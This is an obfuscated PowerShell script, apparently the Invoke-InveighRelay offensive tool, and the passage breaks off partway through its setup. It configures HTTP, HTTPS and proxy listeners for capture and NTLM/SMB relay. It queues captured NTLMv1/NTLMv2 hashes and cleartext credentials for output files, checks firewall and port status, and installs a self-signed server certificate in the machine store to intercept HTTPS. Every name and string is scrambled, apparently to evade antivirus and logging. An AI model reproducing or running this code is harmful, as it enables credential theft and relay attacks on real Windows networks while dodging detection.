 &('SV')  cY4F (  [tYPe]("{1}{0}"-F'le','HAshTAb')  ) ;  ${u`L3} =[TyPe]("{7}{6}{5}{3}{2}{1}{4}{0}"-f 'CESS','.','Ics','st','pro','No','.DiAG','SYStem')  ;  &("{1}{0}{2}"-f'-It','SET','eM') vARIABLE:G813s5  ([Type]("{0}{1}" -f 'str','ing')  ) ;  ${J`G6}  =[tyPe]("{1}{0}"-f 'aTH','m');  &("{0}{1}"-f'se','T') ('12'+'UX')  (  [TYpE]("{0}{4}{1}{5}{3}{2}" -F 'Sy','eM.','S','pAddReS','ST','neT.I')  ) ;  &("{1}{0}"-f'T-Item','Se')  vARiAbLE:0l4to  ( [TYPe]("{6}{1}{7}{0}{3}{5}{2}{4}"-F 'AUtHENtICAT','eM.S','SSlP','I','rotOCOlS','oN.','SySt','EcuRitY.')  ) ;   &('Sv')  ('kp'+'A') ([type]("{1}{4}{3}{0}{2}" -F 'V','sYStEm','Ert','N','.CO'));  ${W`2e`hx} = [TyPe]("{0}{1}{2}{3}{4}"-F 'S','YSTe','M.','b','iTCoNVERtER');   &("{0}{2}{1}"-f'seT','iTem','-') variAbLe:oAkF (  [tYpE]("{2}{1}{0}{3}{4}"-f 'en','Em.tEXt.','sYsT','COdiN','G'));  &("{1}{0}" -f 'TEm','Set-i')  varIAbLe:57Xtn6 ([TYPE]("{2}{0}{1}" -F 'UNSPA','cEFaCtORy','R')  )  ;  &("{0}{1}"-f 'SE','T')  ('4Oj'+'wp')  (  [Type]("{2}{1}{3}{0}" -f'l','Er','pOw','sHeL')  ) ;  &("{1}{0}" -f'eT','S')  ("y"+"UB6") ( [type]("{6}{7}{5}{2}{3}{0}{1}{4}" -f 'a','T','sto','pW','Ch','s.','sySt','eM.dIAgNoSTIC') )  ;&("{2}{0}{1}{3}" -f '-varIa','BL','sET','e') ('Y2N'+'o') ([TyPE]("{0}{1}" -f'cons','oLE') ); function INv`okE-INVeI`g`H`ReLay
{



[CmdletBinding()]
param
( 
    [parameter(manDatORy=${fA`l`se})][Array]${Htt`p`ReSetde`LaY} = ("{0}{1}" -f'Firefo','x'),
    [parameter(mandatORy=${fa`L`Se})][Array]${pRoxyIGn`o`RE} = ("{1}{0}{2}" -f 'e','Fir','fox'),
    [parameter(MANdATOry=${fal`Se})][Array]${UsEr`NA`meS} = "",
    [parameter(MaNDAtOrY=${F`AL`sE})][Array]${Wp`Ad`A`U`THiGnORe} = "",
    [parameter(MAnDAToRy=${FA`l`se})][Int]${C`oNSo`lEQu`E`UElIm`it} = "-1",
    [parameter(manDATOry=${F`AlsE})][Int]${c`On`soLEStATUS} = "",
    [parameter(maNDatOry=${Fa`L`sE})][Int]${HtTP`PORt} = "80",
    [parameter(MaNdAtORy=${fA`lSE})][Int]${HT`T`PspoRt} = "443",
    [parameter(mANDaTOry=${F`A`lse})][Int]${h`TTPre`s`ET`dEl`AYTImEouT} = "30",
    [parameter(mANDaToRY=${f`A`LSe})][Int]${p`RoX`yp`ORT} = ("{1}{0}"-f'492','8'),
    [parameter(mANDATORY=${FA`Lse})][Int]${Ru`N`TIME} = "",
    [parameter(MaNdatOrY=${TR`Ue})][String]${c`o`mmANd} = "",
    [parameter(mANDAtORy=${fAl`sE})][String]${htt`psceRTI`s`Su`er} = ("{0}{1}" -f'I','nveigh'),
    [parameter(ManDATOrY=${f`ALsE})][String]${hTtp`s`CEr`TsUBjeCT} = ("{1}{0}"-f 'lhost','loca'),
    [parameter(MANdAtoRY=${F`Al`se})][String]${seR`VIce},
    [parameter(ManDatORy=${Tr`UE})][String]${Ta`Rget} = "",
    [parameter(mAndAtoRy=${FA`L`se})][ValidateSet("Y","N")][String]${COn`SOl`E`UnIQue} = "Y",
    [parameter(MANDaTory=${faL`Se})][ValidateSet("Y","N")][String]${FI`LeOU`T`put} = "N",
    [parameter(mAndaTOry=${fAl`SE})][ValidateSet("Y","N")][String]${H`TTP} = "Y",
    [parameter(maNDAtOrY=${FAl`se})][ValidateSet("Y","N")][String]${ht`TPS} = "N",
    [parameter(maNdaTOry=${FA`l`SE})][ValidateSet("Y","N")][String]${h`TTPsF`O`RCECERT`DelEte} = "N",
    [parameter(MANdaToRY=${faL`sE})][ValidateSet("Y","N")][String]${LOgO`UTP`Ut} = "Y",
    [parameter(mandATORy=${f`A`lsE})][ValidateSet("Y","N")][String]${Ma`c`hIne`AcCoUntS} = "N",
    [parameter(MAnDatOry=${fa`Lse})][ValidateSet("Y","N")][String]${o`UTPU`TstrEaMo`NLY} = "N",
    [parameter(mAndAtoRy=${FAL`Se})][ValidateSet("Y","N")][String]${pr`oXY} = "N",
    [parameter(MaNDATOry=${f`ALSE})][ValidateSet("Y","N")][String]${r`el`AY`AUTodISAbLE} = "Y",
    [parameter(manDatory=${FA`l`sE})][ValidateSet("Y","N")][String]${RELAY`Au`TO`exIT} = "Y",
    [parameter(MAnDAtOrY=${f`Al`sE})][ValidateSet("Y","N")][String]${SHoW`He`LP} = "Y",
    [parameter(MAndATorY=${fAL`SE})][ValidateSet("Y","N")][String]${s`TarTup`CHEC`ks} = "Y",
    [parameter(maNdaTORy=${f`ALSE})][ValidateSet("Y","N")][String]${S`Tatu`sOuT`puT} = "Y",
    [parameter(MAnDaTory=${fA`lse})][ValidateSet("Y","N","Low",{"{0}{1}"-f 'Me','dium'})][String]${COnsO`leO`Ut`P`Ut} = "N",
    [parameter(mAnDATORY=${Fa`lSe})][ValidateSet("0","1","2")][String]${tO`Ol} = "0",
    [parameter(maNdatOry=${fa`LsE})][ValidateSet({"{2}{0}{1}{3}" -f'y','mou','Anon','s'},{"{1}{0}" -f 'TLM','N'})][String]${WP`ADA`U`Th} = ("{0}{1}" -f'N','TLM'),
    [parameter(MANdATORY=${FA`LsE})][ValidateScript({&("{2}{1}{0}"-f'Path','t-','Tes') ${_}})][String]${f`I`L`Eo`UTP`UtD`IREcToRy} = "",
    [parameter(MAnDaTOrY=${f`ALSE})][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]${c`hA`LleNge} = "",
    [parameter(ManDATorY=${fAl`SE})][Switch]${S`mb1},
    [parameter(maNdaTORy=${F`Al`sE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${H`TT`pip} = ("{2}{1}{0}" -f'.0.0','.0','0'),
    [parameter(mANDAtoRy=${F`AlSE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${PRo`xYIp} = ("{0}{1}{2}"-f '0','.0.0.','0'),
    [parameter(VAlUEfRomrEMAinINgARgUMEntS=${TR`UE})]${inVa`lid_`paRaMet`Er}
)

if (${INV`A`lI`d_pAra`mEtER})
{
    &("{2}{1}{3}{0}" -f'put','i','Wr','te-Out') "Error:$($invalid_parameter) is not a valid parameter. "
    throw
}

${INVeiG`H`_V`er`SioN} = "1.3"

if(${pRo`x`YiP} -eq ("{0}{2}{1}" -f'0','0.0.0','.'))
{ 
    ${PrO`xY_W`p`Ad`_Ip} = (&("{2}{3}{0}{1}" -f 't-C','onnection','T','es') ("{2}{0}{1}"-f '.','0.1','127.0') -count 1 | &("{0}{3}{2}{1}{4}" -f 'Se','ec','j','lect-Ob','t') -ExpandProperty ("{2}{1}{0}"-f '4Address','v','Ip'))
}

if(!${FI`LEoU`TputdiR`E`Ct`oRy})
{ 
    ${OUT`pU`T_dIrec`Tory} = ${p`WD}."PA`Th"
}
else
{
    ${ou`TPUt_dIR`ECTO`Ry} = ${FiLE`OUTPuT`DIr`ec`T`oRy}
}

if(!${i`Nv`eIGh})
{
    ${g`lOBal`:In`VeiGH} =  (&('ls')  VArIAblE:CY4F )."v`ALUE"::("{1}{3}{2}{0}" -f'ized','S','nchron','y').Invoke(@{})
    ${I`NVeI`gH}."C`lEar`TeX`T_LIst" = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{5}{3}{4}{0}{2}"-f 'ra','System.Col','yList','ecti','ons.Ar','l')
    ${Inv`Ei`GH}."Ip_`cAptu`RE_lISt" = &("{0}{2}{1}{3}"-f'New-O','jec','b','t') ("{2}{8}{0}{5}{3}{4}{1}{6}{7}" -f'o','on','Sys','t','i','llec','s.Arra','yList','tem.C')
    ${in`VE`IGh}."L`og" = &("{0}{2}{1}"-f 'New','ct','-Obje') ("{1}{3}{2}{5}{4}{0}" -f'st','System.','ection','Coll','Li','s.Array')
    ${iNV`eIGh}."n`TLmV1`_List" = &("{3}{1}{0}{2}" -f 'w-','e','Object','N') ("{6}{0}{5}{1}{3}{4}{2}" -f'ions','r','t','ra','yLis','.A','System.Collect')
    ${inv`e`igh}."NT`LmV1_`U`sE`RNAmE_L`ISt" = &("{1}{2}{0}" -f'Object','Ne','w-') ("{4}{7}{5}{2}{3}{0}{6}{1}"-f'ons.A','yList','c','ti','Sy','.Colle','rra','stem')
    ${i`N`VeiGH}."n`Tlm`V2_LI`ST" = &("{0}{2}{1}"-f 'New','Object','-') ("{2}{5}{0}{7}{3}{4}{6}{1}"-f'ections','st','Sy','Arr','ay','stem.Coll','Li','.')
    ${I`NvE`iGH}."ntlMv2_usE`RN`AME`_`liSt" = &("{2}{0}{1}{3}"-f'bj','e','New-O','ct') ("{4}{2}{0}{3}{1}" -f'.Collectio','t','em','ns.ArrayLis','Syst')
    ${inve`igH}."pOsT_RE`QU`es`T_liSt" = &("{1}{0}{2}"-f'b','New-O','ject') ("{1}{0}{4}{5}{2}{3}"-f'.Col','System','s','.ArrayList','l','ection')
    ${I`NVei`gh}."smbrELa`y_`F`AiLe`d`_LIst" = &("{0}{2}{1}"-f'Ne','-Object','w') ("{4}{3}{2}{0}{1}" -f'ti','ons.ArrayList','ec','tem.Coll','Sys')
    ${in`VeI`Gh}."VAl`i`D_HO`sT`_lisT" = &("{1}{0}{2}"-f 'bje','New-O','ct') ("{4}{5}{6}{0}{3}{2}{1}" -f 'o','ayList','r','llections.Ar','Syste','m.','C')
}

if(${INV`E`igH}."rELA`y_RunNI`NG")
{
    &("{0}{3}{1}{2}" -f 'Wri','tp','ut','te-Ou') ("{2}{1}{11}{10}{12}{6}{8}{7}{3}{0}{4}{9}{5}" -f 'to','-In','Error:Invoke','se S','p','eigh','eady running,','u',' ','-Inv',' i','veighRelay','s alr')
    throw
}

if(!${inVE`iGh}."RU`N`NiNG")
{
    ${InV`E`igh}."Cle`ArTEXT_Fi`l`E_quEUe" = &("{2}{0}{1}{3}"-f '-','Ob','New','ject') ("{2}{7}{0}{6}{5}{4}{3}{1}"-f 'ste','ArrayList','S','tions.','c','olle','m.C','y')
    ${INvE`IgH}."coN`S`oLE_QUEUe" = &("{0}{1}{2}" -f 'N','ew-Obj','ect') ("{1}{0}{3}{2}{4}" -f 'em.Co','Syst','ti','llec','ons.ArrayList')
    ${inve`iGh}."ht`T`p_`ChaLl`eNge_QuEue" = &("{2}{0}{1}{3}"-f 'ew','-O','N','bject') ("{0}{7}{3}{8}{4}{6}{5}{1}{2}"-f'Syst','yLi','st','Col','ect','ons.Arra','i','em.','l')
    ${In`V`EIgh}."LoG_`FIlE`_QU`eUE" = &("{2}{1}{0}"-f 'ct','w-Obje','Ne') ("{1}{3}{4}{2}{0}{5}"-f'y','Syst','ns.Arra','em.','Collectio','List')
    ${I`Nv`eIgH}."nTLmV1`_fI`lE`_QUEuE" = &("{0}{1}{2}" -f 'Ne','w-O','bject') ("{5}{0}{2}{3}{4}{6}{1}{7}"-f 'c','s','tion','s.','ArrayL','System.Colle','i','t')
    ${iN`V`EigH}."Nt`LMV2`_`FI`LE_QuE`Ue" = &("{3}{1}{2}{0}" -f'ct','-','Obje','New') ("{0}{5}{3}{4}{8}{7}{1}{6}{2}"-f 'Syste','L','t','.Co','ll','m','is','ay','ections.Arr')
    ${I`N`VEIgH}."pOST_ReQ`UESt_`FiLE`_q`Ueue" = &("{0}{1}{2}" -f'New-Obj','e','ct') ("{2}{3}{0}{5}{1}{4}{6}"-f'll','.Ar','Sys','tem.Co','ray','ections','List')
    ${Inv`ei`gh}."sTA`Tu`s`_QUeue" = &("{0}{2}{1}" -f 'New','Object','-') ("{7}{6}{2}{1}{4}{3}{0}{5}" -f'Li','s','n','rray','.A','st','stem.Collectio','Sy')
    ${i`NVe`igh}."C`o`Nsol`e_`iNpUT" = ${T`RUe}
    ${INVe`igH}."C`onSo`lE`_`ouTput" = ${faL`Se}
    ${In`VEi`GH}."Fi`Le_`outPUT" = ${f`A`lsE}
    ${invEi`gH}."H`TTpS_`eXisting_CEr`TiFI`CAtE" = ${FAL`sE}
    ${In`VEi`gH}."Http`s_fO`Rce_CeRt`IfIcate_D`e`LEtE" = ${Fal`Se}
    ${I`Nve`iGh}."lOg_o`Ut`pUt" = ${tr`Ue}
    ${I`NVEI`gh}."cLEaR`TEX`T_ou`T_F`i`le" = ${OUT`Pu`T`_D`iReCt`Ory} + ((("{2}{0}{4}{5}{1}{3}{6}"-f'eI','h-C','Nn','lea','nvei','g','rtext.txt'))."R`EPLACE"('Nne',[strInG][CHaR]92))
    ${INV`ei`Gh}."lOg`_`ouT_fiLe" = ${O`Ut`pUt`_dIr`ectORY} + ((("{3}{0}{2}{5}{1}{4}" -f 'TInvei','Log.tx','gh','C8','t','-')).("{0}{1}"-f'R','epLaCE').Invoke('C8T','\'))
    ${Inv`ei`gH}."nt`lmv`1_OUT`_FILe" = ${out`Pu`T`_diRECToRY} + ((("{5}{1}{6}{2}{0}{3}{4}" -f 'T','n','eigh-N','LMv1.t','xt','RKSI','v'))  -CREplaCE 'RKS',[CHar]92)
    ${I`N`VeIGh}."n`TlMV2_OUT_F`IlE" = ${O`U`TPUt_DIre`Ctory} + ((("{3}{2}{1}{4}{0}" -f 'xt','nveigh-','I','X9f','NTLMv2.t'))-CREplAcE  ([ChAr]88+[ChAr]57+[ChAr]102),[ChAr]92)
    ${in`V`eiGH}."pOS`T`_`R`EQuEST_ou`T_FILe" = ${o`UtPUT`_d`irE`c`TORY} + ((("{0}{3}{4}{1}{2}"-f'Hh7Inveigh-F','u','t.txt','ormI','np')).("{0}{1}" -f 'rePlAc','e').Invoke('Hh7','\'))
}

if(${STAr`TupCHEC`KS} -eq 'Y')
{

    ${Fire`wA`lL_StAT`Us} = &("{0}{1}"-f 'n','etsh') ("{2}{0}{1}{3}" -f 'v','f','ad','irewall') ("{0}{1}"-f's','how') ("{3}{0}{1}{2}" -f 'lp','ro','files','al') ("{0}{1}" -f'st','ate') | &("{1}{2}{3}{0}" -f 't','Wh','ere-Obj','ec') {${_} -match 'ON'}

    if(${H`TtP} -eq 'Y')
    {
        ${h`TtP_P`o`RT_ch`eck} = &("{1}{0}{2}"-f'ets','n','tat') -anp ("{0}{1}"-f'T','CP') | &("{0}{1}{2}" -f'f','indst','r') ("{1}{0}" -f'ING','LISTEN') | &("{1}{0}" -f 'r','findst') ((("{6}{5}{1}{2}{0}{3}{4}"-f'HTTPPo','vHTTPIP',':QDv','r','t ','D','/C:Q'))  -replACe([CHaR]81+[CHaR]68+[CHaR]118),[CHaR]36)
    }

    if(${H`Tt`pS} -eq 'Y')
    {
        ${H`T`T`pS_Por`T_check} = &("{0}{1}{2}"-f'nets','ta','t') -anp ("{0}{1}"-f'TC','P') | &("{1}{0}" -f'ndstr','fi') ("{2}{1}{0}" -f 'G','TENIN','LIS') | &("{0}{1}{2}"-f'fi','nd','str') (("{0}{1}{4}{2}{5}{3}" -f '/C:BvsHT','TP',':B','ort ','IP','vsHTTPSP'))."REPlA`Ce"('Bvs',[sTrinG][cHAr]36)
    }

    if(${p`Ro`XY} -eq 'Y')
    {
        ${PROxY_`Po`Rt`_`cHEck} = &("{2}{0}{1}"-f's','tat','net') -anp ("{0}{1}"-f 'T','CP') | &("{0}{1}"-f'fi','ndstr') ("{2}{0}{3}{1}" -f 'TENI','G','LIS','N') | &("{1}{0}{2}"-f 'ndst','fi','r') (("{0}{2}{1}{3}{4}"-f'/C','xy',':qQbHTTPIP:qQbPro','Port',' '))."RepL`AcE"(([CHaR]113+[CHaR]81+[CHaR]98),[StrING][CHaR]36)
    }

}

${iNve`i`gh}."RElA`Y_R`UNninG" = ${T`RUe}
${INV`EI`Gh}."s`mb`_rElAy" = ${t`Rue}

if(${ST`AtUSOut`P`UT} -eq 'Y')
{
    ${iNV`ei`gh}."s`T`A`TUS_OUTpUt" = ${T`RuE}
}
else
{
    ${i`NveIGh}."S`TATUs`_outpUT" = ${Fa`l`SE}
}

if(${O`UT`putsTrE`Am`oNly} -eq 'Y')
{
    ${InV`e`IGH}."OuT`PUT_S`T`Re`Am_Only" = ${T`RUE}
}
else
{
    ${iNv`E`IGh}."oU`TPUT_S`TREAM`_o`N`LY" = ${fa`Lse}
}

if(${T`OOl} -eq 1) 
{
    ${iNV`eI`GH}."t`ooL" = 1
    ${i`NVe`iGh}."o`UT`pu`T_strEA`m_`ONly" = ${t`RUE}
    ${I`NVe`iGH}."Ne`WlINE" = ""
    ${con`soL`eouTp`Ut} = "N"
}
elseif(${To`ol} -eq 2) 
{
    ${in`V`EIGh}."to`OL" = 2
    ${inve`I`Gh}."o`UTpuT_`sT`REAM_`ON`ly" = ${TR`UE}
    ${I`Nv`EIgh}."C`oNsOl`E_INPuT" = ${FAl`se}
    ${i`NVe`IGh}."nE`WLinE" = ""
    ${loGou`T`P`Ut} = "N"
    ${ShO`wHe`LP} = "N"

    switch (${cO`N`s`olEou`Tput})
    {

        'Low'
        {
            ${C`oNSo`leOUtpuT} = "Low"
        }

        ("{0}{1}" -f 'Mediu','m')
        {
            ${Co`NSolE`oU`TpUt} = ("{2}{1}{0}"-f 'm','ediu','M')
        }

        ("{1}{0}{2}" -f 'a','def','ult')
        {
            ${c`ONS`O`leOutpUt} = "Y"
        }

    }

}
else
{
    ${in`VeI`gh}."tO`oL" = 0
    ${InVei`gh}."nE`WlI`Ne" = ""
}


${i`Nve`iGh}."STAt`US_q`UeuE".("{1}{0}"-f 'dd','A').Invoke(("Inveigh Relay $inveigh_version started at $(Get-Date -format 's') ")) > ${Nu`lL}

if(${FilE`oUT`pUt} -eq 'Y')
{
    ${In`Ve`IGH}."lO`g`_FIL`E`_qUeuE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh Relay $inveigh_version started ")) > ${N`Ull}
}

if(${loGou`TP`Ut} -eq 'Y')
{
    ${i`N`VeiGh}."l`Og".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - Inveigh Relay started ")) > ${N`ULl}
    ${i`Nv`eigh}."lOg_o`Ut`PUt" = ${T`Rue}
}
else
{
    ${INvei`gh}."LoG`_O`UT`pUt" = ${fAl`sE}
}

if(${FIReWa`Ll_sta`T`Us})
{
    ${i`NV`eIGh}."STA`TUs_Qu`e`UE".("{1}{0}" -f 'dd','A').Invoke(("{4}{5}{3}{6}{0}{2}{1}{7}" -f ' En','l','ab','l','Windows Fi','rewa','l =','ed'))  > ${n`Ull}

    ${FIRe`W`ALL`_RULES} = &("{2}{1}{0}" -f 'ect','ew-Obj','N') -comObject ("{5}{4}{2}{0}{1}{3}"-f'wPol','icy','g.F','2','f','HNetC')
    ${f`i`ReW`A`lL_POwEr`SheLl} = ${FI`R`EWAll_`RuLes}."RUL`es" | &("{1}{3}{2}{0}"-f 't','Where-O','c','bje') {${_}."e`N`ABlED" -eq ${TR`UE} -and ${_}."DIrE`CTion" -eq 1} |&("{2}{1}{0}" -f'ct-Object','e','Sel') -Property ("{1}{0}"-f'me','Na') | &("{2}{0}{1}{4}{3}" -f'ele','ct-St','S','g','rin') "Windows PowerShell}"

    if(${F`iRe`W`AlL_P`oWErsHelL})
    {
        ${i`Nve`Igh}."STa`Tu`S_QuEUe".("{0}{1}"-f 'Ad','d').Invoke(("{4}{11}{10}{9}{2}{6}{5}{7}{1}{0}{8}{3}" -f'll','= A','Pow','d','Wind','.exe','erShell',' ','owe','wall - ','re','ows Fi'))  > ${nU`lL}
    }

}

if(${hT`TP} -eq 'Y')
{

    if(${h`Ttp_`P`Or`T`_cHecK})
    {
        ${h`TtP} = "N"
        ${iNVE`IGH}."StAtuS_qu`e`UE".("{1}{0}"-f 'd','Ad').Invoke(('H'+'TTP '+'Capt'+'u'+'re/Re'+'lay '+'Di'+'sabled '+'Due'+' '+'To'+' '+'In'+' '+'Us'+'e '+'Po'+'rt '+"$HTTPPort"))  > ${N`Ull}
    }
    else
    {
        ${In`V`EIgh}."STatu`s_Q`Ue`UE".("{0}{1}"-f 'Ad','d').Invoke(("{5}{2}{6}{0}{3}{4}{1}" -f'e','led',' ','lay = En','ab','HTTP','Capture/R'))  > ${nU`lL}

        if(${H`Tt`pIp})
        {
            ${inv`e`igH}."S`T`Atu`S_QUeue".("{1}{0}" -f'dd','A').Invoke(('HTT'+'P '+'I'+'P '+'A'+'dd'+'ress '+'= '+"$HTTPIP")) > ${N`ULl}
        }

        if(${h`Tt`pPOrt} -ne 80)
        {
            ${i`Nv`eigH}."S`T`Atus_que`Ue".("{1}{0}"-f 'd','Ad').Invoke(('H'+'TTP '+'Por'+'t '+'= '+"$HTTPPort")) > ${N`UlL}
        }
    }

}
else
{
    ${In`VEI`GH}."sTa`T`US_qu`EUe".("{1}{0}"-f 'dd','A').Invoke(("{4}{3}{6}{5}{2}{0}{1}"-f 'ble','d','sa','C','HTTP ',' = Di','apture/Relay'))  > ${Nu`lL}
}

if(${htT`ps} -eq 'Y')
{

    if(${ht`Tps_p`ort`_c`hE`CK})
    {
        ${H`Ttps} = "N"
        ${inv`eIGH}."htT`pS" = ${fa`lse}
        ${iNv`e`IGh}."status_q`U`E`UE".("{1}{0}"-f'dd','A').Invoke(('HTTPS'+' '+'Capt'+'ure/Rel'+'a'+'y '+'Disab'+'led'+' '+'D'+'ue '+'To'+' '+'I'+'n '+'Us'+'e '+'Port'+' '+"$HTTPSPort"))  > ${nu`lL}
    }
    else
    {

        try
        {
            ${In`VEI`Gh}."ceRTI`FI`cA`TE_i`s`sUEr" = ${hTTpSCeR`T`I`sSUeR}
            ${invE`i`Gh}."cE`RtIFiCA`TE`_`cn" = ${h`Tt`PSceRt`SUbJect}
            ${In`Ve`IGh}."St`A`Tus`_QuEUe".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}{7}{3}{6}{8}{2}{4}{5}"-f'TPS Cer','HT','Issuer','ifi',' ','= ','c','t','ate ') + ${I`Nvei`Gh}."CErT`iFIc`ATe_IsSu`ER")  > ${n`Ull}
            ${InVe`i`Gh}."sta`TUs_`QuEUe".("{1}{0}"-f 'd','Ad').Invoke(("{3}{4}{1}{5}{0}{6}{2}"-f'cate CN ','Certif',' ','HT','TPS ','i','=') + ${inv`E`iGH}."ceRTI`FIcA`TE_Cn")  > ${nU`ll}
            ${CeRtiF`Ic`A`Te_chE`ck} = (&("{3}{4}{1}{2}{0}" -f 'Item','hi','ld','Get-','C') (("{0}{5}{6}{2}{3}{1}{4}"-f 'Cert:','ac','o','calM','hinea7LMy','a','7LL'))."r`epla`Ce"(([chAr]97+[chAr]55+[chAr]76),'\') | &("{2}{3}{0}{1}"-f'ec','t','Wher','e-Obj') {${_}."I`sSUEr" -match ${In`VEIGh}."cERti`Fi`catE_iSs`U`er"})

            if(!${C`eRTif`icaTE_CH`E`ck})
            {
                
                ${CERT`iF`Ica`Te_d`i`sti`NgUI`s`HED_NAMe} = &("{0}{2}{1}"-f'new-o','ject','b') -com ("{3}{6}{1}{2}{7}{5}{4}{0}"-f 'me','ent.C','X','X509E','a','nguishedN','nrollm','500Disti')
                ${cER`Tif`IcaTe`_di`st`IN`guIsHED_NAMe}.("{1}{0}"-f 'de','Enco').Invoke( "CN=" + ${I`Nv`eiGH}."Cer`TiF`IC`At`E_cn", ${ceR`TiFI`cat`E_DI`s`TI`NgUIsHED`_NA`mE}."x500n`AmeFla`gS"."X500Name`F`LaGs"."Xcn`_C`e`RT_Na`ME_sTr_None")
                ${c`ertifICa`T`e_iSsU`eR_DI`s`TING`UISHe`D_nA`Me} = &("{1}{0}{2}{3}" -f'w-ob','ne','j','ect') -com ("{9}{3}{6}{4}{5}{2}{8}{0}{1}{7}"-f'sti','nguis','CX500','09Enr','men','t.','oll','hedName','Di','X5')
                ${CErtIfiC`A`T`e_`IsSueR_dIST`INGuiSH`ed_name}.("{0}{1}"-f'En','code').Invoke("CN=" + ${iNv`ei`Gh}."C`e`RtIfic`Ate_ISS`UER", ${C`E`RT`iFicAt`e_DisT`INgUiSHED_nAmE}."X500`N`AmE`FlA`Gs"."X`500NA`meFlAGs"."XcN`_Ce`RT_na`mE`_`STR_NonE")
                ${ce`RtiF`ic`AT`E_KEY} = &("{0}{2}{1}" -f'new-o','ect','bj') -com ("{0}{6}{3}{5}{4}{2}{1}" -f'X509Enrollment.CX','y','Ke','riv','e','at','509P')
                ${CE`RTifiCATe_`KeY}."P`RovIderna`Me" = ("{3}{0}{6}{2}{11}{4}{5}{9}{1}{8}{10}{7}"-f'roso','tographic ','ed ','Mic','A and AES',' C','ft Enhanc','er','Pr','ryp','ovid','RS')
                ${cerT`I`FI`caTe_KEY}."KEy`sPec" = 2
                ${CEr`TiFiCaTE`_keY}."Len`gth" = 2048
			    ${cerTif`I`cATe_keY}."machInE`cO`NteXT" = 1
                ${CE`R`TIfICAT`E_k`ey}.("{0}{1}{2}" -f'C','r','eate').Invoke()
                ${CErt`i`FicATE`_SeRVE`R_Auth_`O`id} = &("{2}{1}{0}"-f 'ect','obj','new-') -com ("{6}{5}{1}{3}{0}{2}{4}{7}"-f 'bj','.','ec','CO','t','09Enrollment','X5','Id')
			    ${CE`RT`IFicATE`_SErVeR_`AuTH_`oiD}.("{1}{2}{3}{0}" -f'mValue','Initializ','e','Fro').Invoke(("{4}{1}{0}{3}{2}"-f'.1.','3.6','1','5.5.7.3.','1.'))
			    ${ce`R`TIF`Ic`ATe_E`NH`Anc`eD_kEY_`Us`A`Ge_oiD} = &("{2}{0}{1}" -f 'b','ject','new-o') -com ("{2}{1}{7}{3}{0}{6}{4}{5}"-f'e','nrollm','X509E','t.CObj','d','s.1','ctI','en')
			    ${cer`Ti`FiCaTE`_enHAnceD_k`ey_uSAGE_`oID}.("{1}{0}" -f'd','ad').Invoke(${cERT`IF`icA`Te_SEr`Ver`_`AU`TH_oId})
			    ${Ce`RtIfIc`At`e`_e`NhanC`Ed_`K`eY_`USAGE_eX`TEn`sion} = &("{1}{3}{0}{2}" -f '-obje','n','ct','ew') -com ("{4}{3}{7}{5}{0}{1}{8}{9}{10}{6}{2}" -f 'X','509Extens','e','En','X509','t.C','g','rollmen','ionEnhanc','edKeyUs','a')
			    ${CERTificAt`e`_E`NHancED_key_U`saGE`_`eXTe`NSIon}.("{0}{2}{3}{4}{1}"-f'Init','e','ial','izeE','ncod').Invoke(${c`eR`TIFICatE_ENHaNcED`_`Ke`Y_U`SAge`_Oid})
			    ${CE`Rt`Ifi`cAtE} = &("{2}{0}{1}" -f'je','ct','new-ob') -com ("{3}{0}{7}{5}{4}{8}{1}{2}{6}"-f'ollment.CX5','RequestCe','rtific','X509Enr','ficat','9Certi','ate','0','e')
			    ${Ce`RT`I`FICate}.("{2}{1}{3}{4}{0}{5}"-f 'at','alizeFr','Initi','omP','riv','eKey').Invoke(2,${cERTI`FIC`A`TE`_key},"")
			    ${c`e`RTifiCa`TE}."SuBj`ect" = ${c`eRti`FIc`AtE_dIsT`i`N`GU`Is`H`ed_name}
			    ${c`ertIf`iCAte}."iS`s`UeR" = ${C`ERTIfICAT`E_i`sSu`ER_d`I`StINg`Ui`SHE`D_`Name}
			    ${CE`R`TI`FicATE}."NOTBEFO`RE" = (&("{0}{1}{2}" -f 'get-','d','ate')).("{1}{0}{2}"-f'dDa','Ad','ys').Invoke(-271)
			    ${C`ERTIfi`cA`TE}."N`Otaf`TEr" = ${Cer`T`IFIC`ATe}."NOTB`eFo`Re".("{2}{1}{0}"-f's','dDay','Ad').Invoke(824)
			    ${C`ertI`Ficate_haS`H_algoRI`Th`m_O`ID} = &("{1}{0}{2}" -f '-Obj','New','ect') -ComObject ("{3}{1}{4}{0}{2}"-f'ject','t.C','Id','X509Enrollmen','Ob')
			    ${c`ER`TiFIcate_`h`As`H_A`L`gORiTHM_OID}.("{5}{4}{2}{6}{0}{3}{1}"-f'mAlgori','ame','z','thmN','ali','Initi','eFro').Invoke(1,0,0,("{2}{0}{1}" -f'A2','56','SH'))
			    ${cert`IFI`CATE}."hAS`hAlgO`RITHM" = ${c`eRTIfIC`Ate_`hash_alg`ORitHm`_oId}
                ${c`e`RT`IfIcAtE}."X509E`XTeN`sIoNs".("{0}{1}"-f 'A','dd').Invoke(${CERTiF`i`Ca`TE_enhAnc`ed_k`Ey_usaGe_EXtEN`Sion})
                ${Certi`FiCATe_bAsI`C_`cO`N`STrAInTs} = &("{2}{0}{1}"-f '-objec','t','new') -com ("{3}{0}{1}{7}{4}{2}{6}{5}"-f 'lment.CX509Exten','sio','nstrai','X509Enrol','icCo','ts','n','nBas')
			    ${c`Er`TIfic`At`E`_b`AsIc_C`ONS`TRAintS}.("{0}{2}{3}{1}"-f 'Initi','ode','alize','Enc').Invoke(("{0}{1}"-f'tru','e'),1)
                ${ce`RtIFI`C`ATe}."x509`ex`TENS`IoNS".("{0}{1}" -f 'A','dd').Invoke(${CerT`IFiCATe_BASiC_`COnS`Tr`AI`N`Ts})
                ${Ce`Rt`i`FicaTe}.("{0}{1}" -f 'En','code').Invoke()
                ${Cer`TiFiCAte`_en`ROl`LMe`NT} = &("{1}{0}{2}" -f'ec','new-obj','t') -com ("{8}{1}{6}{2}{4}{3}{5}{7}{0}" -f 't','09','nr','nt.CX509Enr','ollme','ollme','E','n','X5')
